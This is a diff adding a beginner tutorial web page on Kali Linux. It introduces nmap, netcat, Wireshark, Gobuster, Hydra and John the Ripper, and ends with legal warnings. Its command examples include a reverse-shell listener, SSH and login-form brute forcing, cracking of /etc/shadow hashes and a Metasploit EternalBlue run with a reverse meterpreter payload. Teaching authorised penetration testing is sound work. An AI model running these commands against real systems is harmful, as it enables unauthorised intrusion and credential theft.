@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Kali Linux Basics — SchooiCodes</title>
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Fira+Code&display=optional" rel="stylesheet">
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="../assets/style.css">
+  <link rel="icon" href="../../personal_library_site/tutorials/favicon.ico">
+</head>
+<body>
+          <nav class="navbar" id="navbar">
+    <div class="nav-container">
+      <a href="../index.html" class="nav-logo"><i class="fas fa-cube"></i> Tech Library</a>
+      <ul class="nav-menu">
+          <li><a href="../index.html"><i class="fas fa-home"></i> Home</a></li>
+          <li><a href="../tutorials/index.html" class="active"><i class="fas fa-book"></i> Tutorials</a></li>
+          <li><a href="../programming/index.html"><i class="fas fa-code"></i> Programming</a></li>
+          <li><a href="../resources/index.html"><i class="fas fa-folder-open"></i> Resources</a></li>
+          <li><a href="../survival/index.html"><i class="fas fa-life-ring"></i> Survival</a></li>
+          <li><a href="../projects/index.html"><i class="fas fa-rocket"></i> Projects</a></li>
+          <li><a href="../piracy/index.html"><i class="fas fa-skull"></i> Piracy</a></li>
+          <li><a href="../docs/crib.html"><i class="fas fa-archive"></i> Crib</a></li>
+        <li><button id="theme-toggle" class="theme-toggle" aria-label="Toggle dark mode"><i class="fas fa-moon"></i></button></li>
+      </ul>
+      <div class="hamburger" id="hamburger">
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+    </div>
+  </nav>
+
+  <div class="container" style="padding-top:100px;padding-bottom:60px;">
+    <main class="main-content" style="max-width:960px;margin:0 auto;">
+      <div class="section-header" style="text-align:left;margin-bottom:32px;">
+        <span class="section-badge"><i class="fas fa-skull"></i> Penetration Testing</span>
+        <h1 class="section-title" style="font-size:2rem;">🐉 Kali Linux Basics</h1>
+        <p style="color:var(--text-secondary);">A beginner-friendly guide to Kali Linux — installation, essential tools, and staying on the right side of the law.</p>
+      </div>
+
+      <h2><i class="fas fa-info-circle"></i> What is Kali Linux?</h2>
+      <p><strong>Kali Linux</strong> is a Debian-based Linux distribution purpose-built for penetration testing, security research, and digital forensics. It is maintained by <strong>Offensive Security</strong> and ships with over 600 pre-installed security tools covering everything from network scanning to wireless attacks to reverse engineering.</p>
+      <p>Kali follows a rolling-release model, meaning you get continuous updates rather than discrete version upgrades. It is the de facto standard OS for ethical hackers and is used in certifications like the <strong>OSCP</strong> (Offensive Security Certified Professional).</p>
+      <div class="alert alert-warning">
+        <i class="fas fa-gavel alert-icon"></i>
+        <div><strong>Legal Warning:</strong> Kali Linux is a tool — like any tool, it can be used for good or for harm. Only test against systems you own or have explicit written permission to test. Unauthorised access is a crime under laws like the Computer Fraud and Abuse Act (CFAA) in the US and the Computer Misuse Act in the UK.</div>
+      </div>
+
+      <h2><i class="fas fa-download"></i> Installation Methods</h2>
+      <p>There are three common ways to run Kali Linux. Choose the one that fits your workflow:</p>
+      <ul>
+        <li><strong>Live USB via Ventoy</strong> — Download the Kali ISO, copy it to a USB with Ventoy, and boot. Nothing touches your hard drive. Great for quick assessments.</li>
+        <li><strong>Full Install</strong> — Install Kali directly on bare metal or inside a VM (VirtualBox / VMware). Persistent storage, full performance.</li>
+        <li><strong>Persistent USB</strong> — Boot from USB <em>with</em> a persistent partition so your tools, scripts, and settings survive reboots. Best of both worlds.</li>
+      </ul>
+      <p>For most beginners, <strong>installing Kali in a VirtualBox VM</strong> is the safest and most convenient starting point. Download the VM image from the official Kali site and import it — boot in under a minute.</p>
+
+      <h2><i class="fas fa-terminal"></i> Essential Tools & Commands</h2>
+      <p>Below are the core tools every Kali user should know. Each is a weapon in its own right — learn them one at a time.</p>
+
+      <h3>🔍 nmap — Network Mapping & Port Scanning</h3>
+      <p><code>nmap</code> (Network Mapper) is the Swiss Army knife of network discovery. It can identify live hosts, open ports, running services, and even the operating system of a target.</p>
+      <pre><code># Scan the top 1000 ports on a target
+nmap 192.168.1.1
+
+# Aggressive scan with OS and version detection
+nmap -A -T4 192.168.1.1
+
+# Scan all 65535 ports with service version info
+nmap -p- -sV 10.10.10.10</code></pre>
+
+      <h3>📡 netcat — The TCP/IP Swiss Army Knife</h3>
+      <p><code>netcat</code> (nc) reads and writes data across network connections. It is used for banner grabbing, port scanning, file transfers, and reverse shells.</p>
+      <pre><code># Banner grab — see what service is running on port 80
+echo "" | nc -v 192.168.1.10 80
+
+# Set up a listener on port 4444 (useful for reverse shells)
+nc -lvnp 4444
+
+# Transfer a file from client to listener
+# Listener: nc -lvnp 4444 > received.zip
+# Client:   nc 192.168.1.100 4444 < file.zip</code></pre>
+
+      <h3>📦 Wireshark — Packet Capture & Analysis</h3>
+      <p><strong>Wireshark</strong> captures and interactively inspects network traffic at the packet level. Use it to analyse protocols, detect anomalies, or extract files from network streams.</p>
+      <pre><code># Capture on interface eth0 and write to file
+wireshark -i eth0 -k -w capture.pcapng
+
+# Analyse a pcap file from the terminal with tshark (CLI version)
+tshark -r capture.pcapng -Y "http.request" -T fields -e http.host -e http.request.uri</code></pre>
+
+      <h3>📁 Dirb / Gobuster — Directory Enumeration</h3>
+      <p>These tools brute-force hidden directories and files on web servers by sending HTTP requests using a wordlist.</p>
+      <pre><code># Dirb with the common wordlist
+dirb http://target.com /usr/share/wordlists/dirb/common.txt
+
+# Gobuster is faster and supports more modes
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+
+# Gobuster DNS subdomain enumeration
+gobuster dns -d target.com -w /usr/share/wordlists/amass/subdomains-top1mil-20000.txt</code></pre>
+      <div class="alert alert-info">
+        <i class="fas fa-lightbulb alert-icon"></i>
+        <div><strong>Tip:</strong> Kali ships wordlists under <code>/usr/share/wordlists/</code>. The <code>rockyou.txt.gz</code> file is there — extract it with <code>gunzip /usr/share/wordlists/rockyou.txt.gz</code>.</div>
+      </div>
+
+      <h3>🔐 Hydra — Brute-Force Authentication</h3>
+      <p><strong>Hydra</strong> performs rapid brute-force attacks against network services such as SSH, FTP, HTTP forms, and more. It is paralellised by default and extremely fast.</p>
+      <pre><code># Brute-force SSH with a user list and password list
+hydra -L users.txt -P pass.txt ssh://192.168.1.10
+
+# Brute-force an HTTP form POST
+hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"</code></pre>
+
+      <h3>🔑 John the Ripper — Password Cracking</h3>
+      <p><strong>John</strong> cracks password hashes using a variety of modes (dictionary, incremental, Markov). It works with countless hash formats out of the box.</p>
+      <pre><code># Extract the hash from a Linux shadow file (combine /etc/passwd and /etc/shadow)
+unshadow passwd shadow > hashes.txt
+
+# Crack with the rockyou wordlist
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+# Show cracked passwords
+john --show hashes.txt</code></pre>
+
+      <h3>💣 Metasploit Framework — Exploitation</h3>
+      <p>The <strong>Metasploit Framework</strong> (msfconsole) is the most widely used exploitation framework. It provides modules for scanning, exploitation, payload generation, and post-exploitation.</p>
+      <pre><code># Launch the Metasploit console
+msfconsole
+
+# Inside msfconsole — search for a module, set options, and run it
+msf6 > search eternalblue
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 > set RHOSTS 192.168.1.20
+msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 > set LHOST 192.168.1.100
+msf6 > run</code></pre>
+
+      <h2><i class="fas fa-gavel"></i> Staying Legal</h2>
+      <p>This cannot be emphasised enough. The same skills that make a great penetration tester can land you in prison if misused. Follow these rules:</p>
+      <ul>
+        <li><strong>Always get written authorisation</strong> before testing any system you do not personally own.</li>
+        <li>Use intentionally vulnerable machines like <strong>Hack The Box</strong>, <strong>TryHackMe</strong>, <strong>VulnHub</strong>, or <strong>DVWA</strong> to practise legally.</li>
+        <li>Set up your own lab with VirtualBox and deliberately vulnerable VMs (Metasploitable 2/3, Kioptrix, DC-1).</li>
+        <li>Never scan or attack networks outside your lab without explicit permission — even a simple nmap scan can be considered unauthorised access in some jurisdictions.</li>
+        <li>Understand the <strong>scope</strong> of any engagement. Testing beyond the agreed scope is a breach of contract and potentially a crime.</li>
+      </ul>
+      <div class="alert alert-success">
+        <i class="fas fa-check-circle alert-icon"></i>
+        <div><strong>Ethical hacking is a legitimate and well-paying career.</strong> Certifications like the <strong>OSCP</strong>, <strong>CEH</strong>, and <strong>PNPT</strong> validate these skills. Use your powers for good.</div>
+      </div>
+
+      <h2><i class="fas fa-book-reader"></i> Next Steps</h2>
+      <p>Start by setting up a Kali VM and practising with <code>nmap</code> on your local network (your own devices). Then move through each tool one at a time — master nmap before touching Metasploit. Set up a vulnerable VM and work through it methodically. The journey of a thousand shells begins with a single <code>nmap</code> scan.</p>
+    </main>
+  </div>
+
+          <footer class="footer">
+    <div class="container">
+      <div class="footer-content">
+        <div class="footer-brand">
+          <h3><i class="fas fa-cube"></i> Tech Library</h3>
+          <p>Free tech tutorials, tools, and resources — curated and organized.</p>
+        </div>
+        <div class="footer-links">
+          <a href="../index.html">Home</a>
+          <a href="../tutorials/index.html">Tutorials</a>
+          <a href="../programming/index.html">Programming</a>
+          <a href="../resources/index.html">Resources</a>
+          <a href="../survival/index.html">Survival</a>
+          <a href="../projects/index.html">Projects</a>
+          <a href="../piracy/index.html">Piracy</a>
+          <a href="../docs/crib.html">Crib</a>
+        </div>
+      </div>
+      <div class="footer-bottom">
+        <p>&copy; 2026 Tech Library. All free resources. <a href="https://github.com/SchooiCodes/library" target="_blank" style="color:rgba(255,255,255,0.7);">GitHub</a></p>
+      </div>
+    </div>
+  </footer>
+
+  <script src="../assets/scripts.js" defer></script>
+</body>
+</html>
